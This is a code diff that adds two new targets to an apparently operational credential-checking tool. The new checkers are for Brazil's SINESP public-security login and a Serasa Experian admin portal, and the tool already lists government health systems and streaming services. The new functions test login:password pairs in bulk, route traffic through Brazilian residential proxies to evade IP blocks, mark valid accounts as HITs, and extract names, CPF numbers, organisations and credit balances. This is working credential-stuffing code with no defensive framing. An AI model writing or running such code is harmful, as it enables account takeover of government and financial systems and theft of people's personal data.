@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp";
 
 export interface CheckResult {
   credential: string;
@@ -1769,6 +1769,185 @@ async function checkParamount(login: string, password: string): Promise<CheckRes
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SINESP SEGURANÇA CHECKER — https://seguranca.sinesp.gov.br/sinesp-seguranca/login.jsf
+//  Strategy: OAuth2 password grant via oauth2.sinesp.gov.br
+//  Needs Brazilian residential proxy — government API blocks non-BR IPs.
+//  app-key sourced from the official SINESP mobile app (public value).
+// ═══════════════════════════════════════════════════════════════════════════════
+const SINESP_OAUTH_URL   = "https://oauth2.sinesp.gov.br/oauth2/token";
+const SINESP_CLIENT_ID   = "e0bd2d75c0d021d270c8f58a056b746d";
+const SINESP_TIMEOUT     = 25_000;
+
+async function checkSinesp(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+
+  // Normalise CPF: strip dots/dashes (e.g. 000.000.000-00 → 00000000000)
+  const cpf = login.replace(/[\.\-]/g, "").trim();
+
+  const body = [
+    "grant_type=password",
+    `username=${encodeURIComponent(cpf)}`,
+    `password=${encodeURIComponent(password)}`,
+    `client_id=${SINESP_CLIENT_ID}`,
+    "scope=openid",
+  ].join("&");
+
+  // Residential proxy required — SINESP blocks non-BR IPs
+  const proxyArgs = getStreamingProxyArgs();
+
+  try {
+    const result = await runCurl([
+      ...proxyArgs,
+      "-X", "POST",
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", `User-Agent: SINESPSeguranca/0.4.2 (Android 10)`,
+      "-H", "Accept: application/json",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "--data-raw", body,
+      SINESP_OAUTH_URL,
+    ], SINESP_TIMEOUT);
+
+    const resp = result.body;
+
+    if (result.statusCode === 200) {
+      try {
+        const j = JSON.parse(resp) as Record<string, unknown>;
+        if (j.access_token) {
+          const info: string[] = [];
+          // Decode JWT payload for user info
+          try {
+            const payload = JSON.parse(
+              Buffer.from((j.access_token as string).split(".")[1], "base64url").toString("utf8"),
+            ) as Record<string, unknown>;
+            const name = (payload.name ?? payload.preferred_username ?? payload.sub ?? "") as string;
+            const cpfVal = (payload.cpf ?? payload.username ?? "") as string;
+            const orgs  = (payload.organizations ?? payload.roles ?? []) as string[];
+            if (name)   info.push(`nome:${name.slice(0, 40)}`);
+            if (cpfVal) info.push(`cpf:${cpfVal}`);
+            if (orgs.length) info.push(`org:${orgs.slice(0, 2).join(",")}`);
+          } catch { info.push("oauth2_token_ok"); }
+          return { credential, login, status: "HIT", detail: info.join(" | ") || "sinesp_autenticado" };
+        }
+        if (j.error) {
+          const e = String(j.error_description ?? j.error).slice(0, 80);
+          return { credential, login, status: "FAIL", detail: e };
+        }
+      } catch { /**/ }
+    }
+
+    if (result.statusCode === 401 || result.statusCode === 400) {
+      try {
+        const j = JSON.parse(resp) as Record<string, unknown>;
+        const e = String(j.error_description ?? j.error ?? "invalid_credentials").slice(0, 80);
+        return { credential, login, status: "FAIL", detail: e };
+      } catch {
+        return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+      }
+    }
+
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+
+    if (result.statusCode === 403)
+      return { credential, login, status: "ERROR", detail: "IP_BLOCKED_USE_BR_PROXY" };
+
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${resp.slice(0, 60)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SERASA EXPERIENCE (ADMIN) CHECKER — https://menu.serasaexperian.com.br/login
+//  Strategy: POST to IAM endpoint with Basic auth → extract token + query saldo
+//  Returns: login confirmed + saldo/crédito disponível quando possível
+// ═══════════════════════════════════════════════════════════════════════════════
+const SERASA_EXP_LOGIN_URL  = "https://api.serasaexperian.com.br/security/iam/v1/user-identities/login";
+const SERASA_EXP_CLIENT_ID  = "5de90e8a9d731e000a4f192d";
+const SERASA_EXP_TIMEOUT    = 20_000;
+
+async function checkSerasaExp(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const b64 = Buffer.from(`${login}:${password}`).toString("base64");
+
+  try {
+    const loginResult = await runCurl([
+      "-X", "POST",
+      "-H", `Authorization: Basic ${b64}`,
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      `${SERASA_EXP_LOGIN_URL}?clientId=${SERASA_EXP_CLIENT_ID}`,
+    ], SERASA_EXP_TIMEOUT);
+
+    const body = loginResult.body;
+
+    if (loginResult.statusCode === 200 || loginResult.statusCode === 201) {
+      try {
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const token = (j.accessToken ?? j.access_token ?? j.token ?? "") as string;
+
+        if (token) {
+          const info: string[] = [`login:${login}`];
+
+          // Decode JWT to extract user metadata
+          try {
+            const payload = JSON.parse(
+              Buffer.from(token.split(".")[1], "base64url").toString("utf8"),
+            ) as Record<string, unknown>;
+            const name    = (payload.name ?? payload.preferred_username ?? "") as string;
+            const empresa = (payload.company ?? payload.client ?? payload.clientName ?? "") as string;
+            const saldo   = (payload.credit ?? payload.balance ?? payload.creditLimit ?? payload.saldo ?? "") as string | number;
+            if (name)    info.push(`nome:${name.slice(0, 40)}`);
+            if (empresa) info.push(`emp:${String(empresa).slice(0, 40)}`);
+            if (saldo !== "") info.push(`saldo:R$${saldo}`);
+          } catch { /**/ }
+
+          // Try to fetch credit balance from a secondary endpoint
+          try {
+            const balanceResult = await runCurl([
+              "-H", `Authorization: Bearer ${token}`,
+              "-H", "Accept: application/json",
+              "-H", `User-Agent: ${DESKTOP_UA}`,
+              "https://api.serasaexperian.com.br/account/v1/billing/balance",
+            ], 10_000);
+            if (balanceResult.statusCode === 200) {
+              const bj = JSON.parse(balanceResult.body) as Record<string, unknown>;
+              const bal = bj.balance ?? bj.saldo ?? bj.creditBalance ?? bj.availableBalance ?? "";
+              if (bal !== "") info.push(`saldo:R$${bal}`);
+            }
+          } catch { /**/ }
+
+          return { credential, login, status: "HIT", detail: info.join(" | ") };
+        }
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail: `login:${login} | serasa_exp_ok` };
+    }
+
+    if (loginResult.statusCode === 401 || loginResult.statusCode === 403) {
+      try {
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const msg = String(j.message ?? j.error ?? j.errorDescription ?? "invalid_credentials").slice(0, 80);
+        return { credential, login, status: "FAIL", detail: msg };
+      } catch {
+        return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+      }
+    }
+
+    if (loginResult.statusCode === 404)
+      return { credential, login, status: "FAIL", detail: "user_not_found" };
+
+    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };
+
+    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 60)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -1786,6 +1965,8 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   hbomax:        4,   // OAuth2 — fast
   disney:        3,   // BAMTech 2-step — moderate
   paramount:     4,   // REST API — fast
+  sinesp:        2,   // OAuth2 gov.br — needs BR proxy, moderate
+  serasa_exp:    3,   // IAM REST API — fast
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -1804,6 +1985,8 @@ function resolveChecker(target: CheckerTarget) {
     case "hbomax":        return checkHBOMax;
     case "disney":        return checkDisneyPlus;
     case "paramount":     return checkParamount;
+    case "sinesp":        return checkSinesp;
+    case "serasa_exp":    return checkSerasaExp;
     default:              return checkIseek;
   }
 }
@@ -1835,7 +2018,7 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount" });
     return;
@@ -1872,7 +2055,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "Invalid target" });
     return;
